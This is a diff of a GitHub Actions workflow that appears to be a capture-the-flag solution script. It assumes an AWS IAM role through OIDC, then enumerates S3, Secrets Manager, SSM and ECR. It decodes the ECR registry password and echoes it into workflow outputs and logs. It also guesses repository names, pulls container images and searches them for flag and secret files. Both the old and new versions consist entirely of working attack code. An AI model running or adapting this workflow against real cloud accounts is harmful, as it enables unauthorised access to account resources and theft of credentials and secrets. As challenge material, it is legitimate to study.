@@ -1,52 +1,36 @@
-# .github/workflows/explore-ecr.yml
-name: Explore ECR (assume role & debug)
+# .github/workflows/fetch.yml
+name: Explore AWS Permissions & ECR
 
-# Run manually
 on:
   workflow_dispatch:
-    inputs:
-      role-to-assume:
-        description: 'IAM role to assume (arn)'
-        required: true
-        default: 'arn:aws:iam::396961015104:role/imaginary-challenge'
-      aws-region:
-        description: 'AWS region'
-        required: true
-        default: 'us-east-1'
-      max-repos:
-        description: 'Max repositories to attempt (0 = all)'
-        required: false
-        default: '0'
 
 permissions:
   id-token: write
   contents: read
 
 jobs:
-  assume-and-explore:
-    name: Assume role and explore ECR
+  assume-role:
+    name: Assume role and explore
     runs-on: ubuntu-latest
     env:
-      # default registry; will be read from AWS/GetAuthorization when needed
-      AWS_DEFAULT_REGION: ${{ github.event.inputs.aws-region }}
-      AWS_REGION: ${{ github.event.inputs.aws-region }}
+      AWS_REGION: us-east-1
+      AWS_DEFAULT_REGION: us-east-1
     steps:
-
-      - name: Checkout repo (helps if you want to save outputs)
+      - name: Checkout repo
         uses: actions/checkout@v4
 
-      - name: Configure AWS Credentials (assume role via OIDC)
+      - name: Configure AWS credentials (assume role via OIDC)
         uses: aws-actions/configure-aws-credentials@v4
         with:
-          role-to-assume: ${{ github.event.inputs.role-to-assume }}
-          aws-region: ${{ github.event.inputs.aws-region }}
+          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
+          aws-region: us-east-1
 
-      - name: Show caller identity (who we are)
+      - name: Show caller identity
         run: |
           echo "=== Caller identity ==="
           aws sts get-caller-identity || true
 
-      - name: Show basic environment (debug)
+      - name: Basic environment & workflow files
         run: |
           echo "=== ENV related to AWS/OIDC ==="
           env | grep -i aws || true
@@ -54,119 +38,90 @@ jobs:
           pwd
           ls -la
 
-      - name: Get ECR registry endpoint & auth token (decoded)
-        id: ecr_auth
+      - name: Try a few read-ish AWS operations (best-effort)
         run: |
-          set -euo pipefail
-          REGION="${{ github.event.inputs.aws-region }}"
-          # get authorizationData JSON
+          set -euo pipefail || true
+          echo "=== Checking S3 ==="
+          aws s3 ls || echo "No S3 list access"
+          echo "=== Checking Secrets Manager ==="
+          aws secretsmanager list-secrets --max-results 10 || echo "No Secrets Manager access"
+          echo "=== Checking SSM Parameters ==="
+          aws ssm describe-parameters --max-results 10 || echo "No SSM access"
+          echo "=== Checking CloudFormation ==="
+          aws cloudformation list-stacks --max-results 10 || echo "No CloudFormation access"
+          echo "=== Describe ECR repos (us-east-1) ==="
+          aws ecr describe-repositories --region us-east-1 || echo "No ECR describe access"
+
+      - name: Get ECR auth token & login (best-effort)
+        id: ecr_login
+        run: |
+          set -euo pipefail || true
+          REGION=us-east-1
+          # Try to get auth token
           auth_json="$(aws ecr get-authorization-token --region "$REGION" --output json 2>/dev/null || echo '{}')"
           echo "raw auth_json: $auth_json"
-          # extract proxyEndpoint and token if available
-          proxy=$(echo "$auth_json" | jq -r '.authorizationData[0].proxyEndpoint // empty')
-          token=$(echo "$auth_json" | jq -r '.authorizationData[0].authorizationToken // empty')
-          if [ -z "$token" ]; then
-            echo "No ECR authorization token available (permission may be missing)."
+          proxy="$(echo "$auth_json" | jq -r '.authorizationData[0].proxyEndpoint // empty')"
+          token="$(echo "$auth_json" | jq -r '.authorizationData[0].authorizationToken // empty')"
+          if [ -n "$token" ]; then
+            decoded="$(echo "$token" | base64 --decode 2>/dev/null || true)"
+            password="$(echo "$decoded" | awk -F: '{print $2}')"
+            echo "proxy=$proxy" >> ecr_output.env
+            echo "password_present=$( [ -n \"$password\" ] && echo true || echo false )" >> ecr_output.env
+            echo "::set-output name=has_token::true"
+            echo "::set-output name=proxy::$proxy"
+            echo "::set-output name=password::$password"
+            # login (ignore failures)
+            echo "$password" | docker login --username AWS --password-stdin "${proxy}" || echo "docker login failed"
+          else
+            echo "No ECR token available (permission missing?)." > ecr_output.env
             echo "::set-output name=has_token::false"
-            exit 0
           fi
-          # typical token is base64 of "AWS:<password>" — decode and cut password
-          decoded="$(echo "$token" | base64 --decode 2>/dev/null || true)"
-          # if decoded contains ':' then assume AWS:password
-          password="$(echo "$decoded" | awk -F: '{print $2}')"
-          echo "proxy=$proxy" | tee auth.output
-          echo "password_present=$( [ -n \"$password\" ] && echo true || echo false )" >> auth.output
-          # expose to later steps
-          echo "::set-output name=proxy::$proxy"
-          echo "::set-output name=password::$password"
-          echo "::set-output name=has_token::true"
         shell: bash
 
-      - name: Docker login to ECR (if token present)
-        if: steps.ecr_auth.outputs.has_token == 'true'
+      - name: Describe repositories and save list
         run: |
-          set -euo pipefail
-          REGISTRY="${{ steps.ecr_auth.outputs.proxy }}"
-          PW="${{ steps.ecr_auth.outputs.password }}"
-          echo "Logging into $REGISTRY"
-          echo "$PW" | docker login --username AWS --password-stdin "$REGISTRY"
+          set -euo pipefail || true
+          REGION=us-east-1
+          aws ecr describe-repositories --region "$REGION" --output json > repos.json 2>/dev/null || echo '{"repositories":[]}' > repos.json
+          echo "Saved repos.json"
         shell: bash
 
-      - name: Describe ECR repositories (list; limited)
+      - name: Try Phrase-Based Names
         run: |
-          set -euo pipefail
-          REGION="${{ github.event.inputs.aws-region }}"
-          MAX="${{ github.event.inputs.max-repos }}"
-          # fetch repositories (paginated); limit if requested
-          repos_json="$(aws ecr describe-repositories --region "$REGION" --output json 2>/dev/null || echo '{ \"repositories\": [] }')"
-          echo "$repos_json" > repos.json
-          repos_count=$(echo "$repos_json" | jq '.repositories | length')
-          echo "Found repositories: $repos_count"
-          if [ "$MAX" -gt 0 ] && [ "$repos_count" -gt "$MAX" ]; then
-            echo "Trimming to first $MAX repos"
-            echo "$(echo "$repos_json" | jq ".repositories |= .[:$MAX]")" > repos.json
-          fi
-          cat repos.json
-        shell: bash
+          set -euo pipefail || true
+          echo "=== Trying phrases from the description ==="
 
-      - name: Enumerate images per repo and attempt pulls
-        run: |
-          set -euo pipefail
-          REGION="${{ github.event.inputs.aws-region }}"
-          REGISTRY="${{ steps.ecr_auth.outputs.proxy }}"
-          # if no registry known, fallback to common format with account id if present in env
-          if [ -z "$REGISTRY" ]; then
-            if [ -n "${ECR_REGISTRY:-}" ]; then
-              REGISTRY="$ECR_REGISTRY"
+          PHRASES=(
+            "never-imagined" "never_imagined" "i-never-imagined"
+            "misconfigure-cloud" "misconfigured-cloud" "cloud-misconfiguration"
+            "github-actions-insecure" "actions-insecure" "insecure-actions"
+            "fiddling-workflow" "fiddle-workflow" "workflow-fiddling"
+            "download-docker-image" "docker-download" "image-download"
+            "where-docker" "from-where" "where-from"
+            "oidc-cool" "cool-oidc" "oidc-misconfigured"
+            "be-careful" "careful-oidc" "oidc-careful"
+          )
+
+          REGISTRY="${ECR_REGISTRY:-396961015104.dkr.ecr.us-east-1.amazonaws.com}"
+
+          for phrase in "${PHRASES[@]}"; do
+            echo "Trying: $phrase"
+            image="$REGISTRY/$phrase:latest"
+            if docker pull "$image" 2>/dev/null; then
+              echo "🎉 FOUND: $image"
+              docker images | grep "$phrase" || true
+              echo "=== Checking container contents (short probe) ==="
+              docker run --rm "$image" sh -c 'find / -maxdepth 3 -type f -name "*flag*" -o -name "*secret*" -o -name "*.txt" 2>/dev/null | head -n 30' || true
+              # stop after first successful discovery
+              break
             else
-              # try to infer from caller/account id
-              account="$(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo '')"
-              if [ -n "$account" ]; then
-                REGISTRY="$account.dkr.ecr.$REGION.amazonaws.com"
-              fi
+              echo "Not present or not allowed: $image"
             fi
-          fi
-          echo "Using registry: $REGISTRY"
-          repos=$(jq -r '.repositories[].repositoryName' repos.json 2>/dev/null || true)
-          if [ -z "$repos" ]; then
-            echo "No repositories listed or cannot access describe-repositories. Exiting this step."
-            exit 0
-          fi
-
-          for repo in $repos; do
-            echo "=== Repo: $repo ==="
-            images_json="$(aws ecr list-images --repository-name "$repo" --region "$REGION" --output json 2>/dev/null || echo '{ \"imageIds\": [] }')"
-            echo "$images_json" | jq '.' || true
-            # try to collect tags
-            tags=$(echo "$images_json" | jq -r '.imageIds[] | ( .imageTag // "<untagged>" )' | tr '\n' ' ' || true)
-            if [ -z "$tags" ]; then
-              echo "No tags for $repo (skipping pull)"
-              continue
-            fi
-            for tag in $tags; do
-              if [ "$tag" = "<untagged>" ]; then
-                # skip untagged images (or you can handle imageDigest)
-                continue
-              fi
-              image="$REGISTRY/$repo:$tag"
-              echo "Attempting docker pull $image"
-              docker pull "$image" || { echo "docker pull failed for $image (permissions or not present)"; continue; }
-              echo "Pulled $image -- trying a quick inside check for common flags (short timeout)"
-              # run inside container and try to cat common flag paths (non-interactive)
-              docker run --rm --entrypoint /bin/sh "$image" -c '\
-                set -euo pipefail || true; \
-                paths="/flag /root/flag /root/flag.txt /app/flag /app/flag.txt /home/*/flag /home/*/flag.txt /flag.txt"; \
-                for f in $paths; do \
-                  if [ -f "$f" ]; then echo "FOUND: $f"; echo "----"; cat "$f" || true; echo "----"; fi; \
-                done; \
-                echo "Listing /:"; ls -la / || true; \
-              ' || echo "container-run had errors (allowed)"; 
-            done
           done
         shell: bash
-        timeout-minutes: 15
+        timeout-minutes: 10
 
-      - name: Save repos.json to artifact (for post-run inspection)
+      - name: Upload repos.json artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
